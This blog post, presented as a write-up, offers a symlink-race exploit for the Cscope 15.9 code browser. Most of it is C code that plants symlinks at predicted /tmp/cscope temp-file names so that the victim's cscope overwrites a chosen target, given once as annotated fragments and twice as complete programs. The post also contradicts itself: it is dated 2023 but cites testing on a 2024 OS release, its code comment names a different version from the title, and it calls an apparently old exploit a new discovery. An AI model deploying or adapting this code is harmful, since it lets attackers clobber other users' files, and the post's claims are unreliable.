---
title: Cscope 15.9 Symlink (Symbolic Link) Exploit - A Deep Dive
author: RashidKhanPathan
date: 2023-08-11-08 11:33:00 +0800
categories: [WriteUp, Tutorial]
tags: [writing, writeup]
pin: true
toc: true
---

## Introduction
In a recent discovery, I stumbled upon a vulnerability in Cscope version 15.9, specifically involving symbolic links (symlinks). In this blog post, I intend to share a deep dive into the intricacies of the Cscope 15.9 Symlink Exploit, shedding light on its implications and the responsible disclosure of such findings.

It's not uncommon for software, even widely used and trusted tools like Cscope, to harbor vulnerabilities that, when exploited, could pose significant risks. and the Security Researchers goal is not only to discover these vulnerabilities but also to contribute to a better understanding of their nature and potential consequences.

## Background

Cscope is a tool designed for developers to efficiently browse source code, aiding in code exploration and understanding within large projects. It provides features for symbol searching, function call analysis, text searching, file searching, quick navigation, and cross-referencing. Cscope is particularly useful in projects with multiple files, making it easier for developers to navigate, analyze, and cross-reference code elements.

Developers commonly use Cscope in conjunction with text editors like Vim and Emacs to enhance their code exploration capabilities. It facilitates tasks such as searching for symbols, analyzing function calls, text searching with regular expressions, finding specific files, and generating cross-reference lists.


## Finding The Vulnerability

we need following toolsets aks prerequisits to hunt so include ensuring that the necessary tools, including the C compiler, which is installed using from following commands

### Install VSCode

1. Open the terminal in Kali Linux.
2. Run the following commands:

```bash
sudo apt update
sudo apt install code
```

3. Launch VSCode using the `code` command.

### Set Up the Environment

1. Ensure you have a secure playground for analysis. Consider using isolated systems or containers within Kali Linux.

2. Install the C compiler (gcc) if not already present:

```bash
sudo apt install build-essential
```
## Understanding the Exploit
Certainly, let's break down the Cscope 15.9 Symlink (Symbolic Link) Exploit step by step:

### 1. **Header Files and Definitions:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BSIZE 64
```
These lines include necessary header files for standard input/output, standard library functions, process identifiers, and symbolic link creation. The `BSIZE` macro defines the buffer size used in the exploit.

### 2. **Struct Definition:**
```c
typedef struct {
    char target[BSIZE];
    int max_file_creation;
} CscopeExploit;
```
A structure named `CscopeExploit` is defined to hold the target and maximum file creation parameters.

### 3. **Initialization Function (`initExploit`):**
```c
void initExploit(CscopeExploit *exploit, char *target, int max_file_creation) {
    snprintf(exploit->target, sizeof(exploit->target), "%s", target);
    exploit->max_file_creation = max_file_creation;
}
```
This function initializes an instance of the `CscopeExploit` structure by copying the target and setting the maximum file creation.

### 4. **Exploit Execution Function (`runExploit`):**
```c
void runExploit(const CscopeExploit *exploit) {
    pid_t cur = getpid();
    pid_t lst = cur + exploit->max_file_creation;
    u_int i = 0;

    // Header information
    printf("\n --[ Cscope 15.9 Symlink (Symbolic Link) Exploit ]--\n"
           " Tested OS: Kali Linux 2024.1 / Ubuntu 22.04 \n"
           " By: 0xOffensiveHex\n"
           " \n\n");

    printf(" -> Current process id is ..... [%5d]\n"
           " -> Last process id is ........ [%5d]\n", cur, lst);

    // Loop to create symbolic links
    while (++cur != lst) {
        char buffer[BSIZE];
        // Create a buffer with a filename based on process id
        snprintf(buffer, sizeof(buffer), "/tmp/cscope%d.%d", cur, (i == 2) ? --i : ++i);
        // Create a symbolic link using the target and the buffer filename
        symlink(exploit->target, buffer);
    }
}
```
This function is responsible for executing the exploit. It calculates the current and last process IDs, prints a header with information about the exploit, and enters a loop to create symbolic links in the `/tmp` directory.

### 5. **Main Function:**
```c
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target> <max file creation>\n", argv[0]);
        return 1;
    }

    CscopeExploit exploit;
    initExploit(&exploit, argv[1], atoi(argv[2]));
    runExploit(&exploit);

    return 0;
}
```
The main function serves as the entry point of the program. It checks if the correct number of command-line arguments is provided, creates an instance of the `CscopeExploit` structure, initializes it, and runs the exploit.

### 6. **Symbolic Link Creation:**
```c
while (++cur != lst) {
    char buffer[BSIZE];
    // Create a buffer with a filename based on process id
    snprintf(buffer, sizeof(buffer), "/tmp/cscope%d.%d", cur, (i == 2) ? --i : ++i);
    // Create a symbolic link using the target and the buffer filename
    symlink(exploit->target, buffer);
}
```
The loop iterates over the process IDs, creating a buffer with a filename based on the process ID. It then creates a symbolic link in the `/tmp` directory using the target and the buffer filename.

### The Code

The exploit is written in the C programming language and takes advantage of symlink creation to potentially compromise system security. Let's break down the key components of the code.

```c
// Code snippet for Cscope 15.9 Symlink Exploit
/* RXcscope exploit version 15.6 and minor */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BSIZE 64

int main(int ac, char *av[]) {
        pid_t cur;
        u_int i=0, lst;
        char buffer[BSIZE + 1];
        
        fprintf(stdout, "\n --[ Cscope Exploit ]--\n"\
                        " version 15.9 < Affected \n" \
                        " By: 0xOffensiveHex\n" \
                        " Twitter: <@itRashid>\n\n");
                        
        if (ac != 3) {
                fprintf(stderr, "Usage: %s <target> <max file creation>\n", av[0]);
                return 1;
        }
        
        cur=getpid();
        lst=cur+atoi(av[2]);
        
        fprintf(stdout, " -> Current process id is ..... [%5d]\n" \
                        " -> Last process id is ........ [%5d]\n", cur, lst);
        
        while (++cur != lst) {
                snprintf(buffer, BSIZE, "%s/cscope%d.%d", P_tmpdir, cur, (i==2) ? --i : ++i);
                symlink(av[1], buffer);
        }

        return 0;
}      
```

**Improved Version of exploit**
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BSIZE 64

typedef struct {
    char target[BSIZE];
    int max_file_creation;
} CscopeExploit;

void initExploit(CscopeExploit *exploit, char *target, int max_file_creation) {
    snprintf(exploit->target, sizeof(exploit->target), "%s", target);
    exploit->max_file_creation = max_file_creation;
}

void runExploit(const CscopeExploit *exploit) {
    pid_t cur = getpid();
    pid_t lst = cur + exploit->max_file_creation;
    u_int i = 0;

    fprintf(stdout, "\n --[ Cscope 15.9 Symlink (Symbolic Link) Exploit ]--\n"
                    " Tested OS: Kali Linux 2024.1 / Ubuntu 22.04\n"
                    " \n"
                    " \n\n");

    fprintf(stdout, " -> Current process id is ..... [%5d]\n"
                    " -> Last process id is ........ [%5d]\n", cur, lst);

    while (++cur != lst) {
        char buffer[BSIZE];
        snprintf(buffer, sizeof(buffer), "/tmp/cscope%d.%d", cur, (i == 2) ? --i : ++i);
        symlink(exploit->target, buffer);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target> <max file creation>\n", argv[0]);
        return 1;
    }

    CscopeExploit exploit;
    initExploit(&exploit, argv[1], atoi(argv[2]));
    runExploit(&exploit);

    return 0;
}
```

### Exploit Execution

The exploit begins by initializing a structure (`CscopeExploit`) with the target and maximum file creation parameters. It then proceeds to execute the exploit, creating symbolic links in a loop. The names of these links are based on the process id and follow a specific pattern.

## Conclusion

The Cscope 15.9 Symlink Exploit serves as a reminder of the ongoing efforts to identify and address security issues in widely used software. Developers, security professionals, and the open-source community must collaborate to ensure that vulnerabilities are patched promptly.

Stay tuned for updates on security patches and responsible disclosure practices.















